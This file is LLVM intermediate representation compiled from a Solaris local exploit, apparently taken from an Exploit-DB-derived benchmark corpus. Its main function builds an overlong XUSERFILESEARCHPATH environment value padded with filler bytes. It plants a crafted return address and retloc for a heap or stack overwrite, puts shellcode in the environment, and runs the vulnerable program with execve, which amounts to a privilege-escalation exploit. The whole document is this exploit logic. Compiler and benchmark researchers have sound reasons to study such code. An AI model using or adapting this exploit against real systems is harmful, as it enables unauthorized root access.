; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_21059.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_21059.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SP = common dso_local global i64 0, align 8
@RETLOC = common dso_local global i64 0, align 8
@__const.main.ev1 = private unnamed_addr constant [21 x i8] c"XUSERFILESEARCHPATH=\00", align 16
@VULPROG = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [6 x i8] c"i86pc\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"Using RET address = 0x%lx\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"Using retloc = 0x%lx \0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"execle\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2048 x i8], align 16
  %7 = alloca [48 x i8], align 16
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca [24 x i8*], align 16
  %11 = alloca [24 x i8*], align 16
  %12 = alloca i64, align 8
  %13 = alloca i32*, align 8
  %14 = alloca [21 x i8], align 16
  %15 = alloca i64, align 8
  %16 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i64, i64* @SP, align 8
  store i64 %17, i64* %9, align 8
  %18 = load i64, i64* @RETLOC, align 8
  store i64 %18, i64* %12, align 8
  %19 = bitcast [21 x i8]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %19, i8* align 16 getelementptr inbounds ([21 x i8], [21 x i8]* @__const.main.ev1, i32 0, i32 0), i64 21, i1 false)
  store i64 1024, i64* %16, align 8
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 1
  br i1 %21, label %22, label %29

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i64 @atoi(i8* %25)
  %27 = load i64, i64* %12, align 8
  %28 = add nsw i64 %27, %26
  store i64 %28, i64* %12, align 8
  br label %29

29:                                               ; preds = %22, %2
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %31 = call i32 @bzero(i8* %30, i32 2048)
  %32 = getelementptr inbounds [21 x i8], [21 x i8]* %14, i64 0, i64 0
  %33 = call i64 @strlen(i8* %32)
  store i64 %33, i64* %15, align 8
  %34 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %35 = getelementptr inbounds [21 x i8], [21 x i8]* %14, i64 0, i64 0
  %36 = load i64, i64* %15, align 8
  %37 = trunc i64 %36 to i32
  %38 = call i32 @memcpy(i8* %34, i8* %35, i32 %37)
  %39 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %40 = load i64, i64* %15, align 8
  %41 = getelementptr inbounds i8, i8* %39, i64 %40
  %42 = load i64, i64* %16, align 8
  %43 = add i64 %42, 48
  %44 = trunc i64 %43 to i32
  %45 = call i32 @memset(i8* %41, float 6.500000e+01, i32 %44)
  %46 = load i8*, i8** @VULPROG, align 8
  %47 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 0
  store i8* %46, i8** %47, align 16
  %48 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 1
  store i8* null, i8** %48, align 8
  %49 = load i8*, i8** @shellcode, align 8
  %50 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 0
  store i8* %49, i8** %50, align 16
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %52 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 1
  store i8* %51, i8** %52, align 8
  %53 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 2
  store i8* null, i8** %53, align 16
  %54 = load i64, i64* %9, align 8
  %55 = load i8*, i8** @VULPROG, align 8
  %56 = call i64 @strlen(i8* %55)
  %57 = sub nsw i64 %54, %56
  %58 = sub nsw i64 %57, 1
  %59 = call i64 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %60 = sub nsw i64 %58, %59
  %61 = sub nsw i64 %60, 1
  %62 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %63 = call i64 @strlen(i8* %62)
  %64 = sub nsw i64 %61, %63
  %65 = sub nsw i64 %64, 1
  %66 = load i8*, i8** @shellcode, align 8
  %67 = call i64 @strlen(i8* %66)
  %68 = sub nsw i64 %65, %67
  %69 = sub nsw i64 %68, 1
  store i64 %69, i64* %8, align 8
  %70 = load i64, i64* %8, align 8
  %71 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i64 %70)
  %72 = load i64, i64* %12, align 8
  %73 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0), i64 %72)
  %74 = getelementptr inbounds [48 x i8], [48 x i8]* %7, i64 0, i64 0
  %75 = bitcast i8* %74 to i32*
  store i32* %75, i32** %13, align 8
  %76 = getelementptr inbounds [48 x i8], [48 x i8]* %7, i64 0, i64 0
  %77 = call i32 @memset(i8* %76, float -1.000000e+00, i32 48)
  %78 = load i32*, i32** %13, align 8
  %79 = getelementptr inbounds i32, i32* %78, i64 0
  store i32 -7, i32* %79, align 4
  %80 = load i64, i64* %8, align 8
  %81 = trunc i64 %80 to i32
  %82 = load i32*, i32** %13, align 8
  %83 = getelementptr inbounds i32, i32* %82, i64 2
  store i32 %81, i32* %83, align 4
  %84 = load i64, i64* %12, align 8
  %85 = sub nsw i64 %84, 8
  %86 = trunc i64 %85 to i32
  %87 = load i32*, i32** %13, align 8
  %88 = getelementptr inbounds i32, i32* %87, i64 8
  store i32 %86, i32* %88, align 4
  %89 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %90 = load i64, i64* %15, align 8
  %91 = getelementptr inbounds i8, i8* %89, i64 %90
  %92 = load i64, i64* %16, align 8
  %93 = getelementptr inbounds i8, i8* %91, i64 %92
  %94 = getelementptr inbounds [48 x i8], [48 x i8]* %7, i64 0, i64 0
  %95 = call i32 @memcpy(i8* %93, i8* %94, i32 48)
  %96 = load i8*, i8** @VULPROG, align 8
  %97 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 0
  %98 = getelementptr inbounds [24 x i8*], [24 x i8*]* %11, i64 0, i64 0
  %99 = call i32 @execve(i8* %96, i8** %97, i8** %98)
  %100 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  ret i32 1
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i64 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @memset(i8*, float, i32) #2

declare dso_local i32 @printf(i8*, i64) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
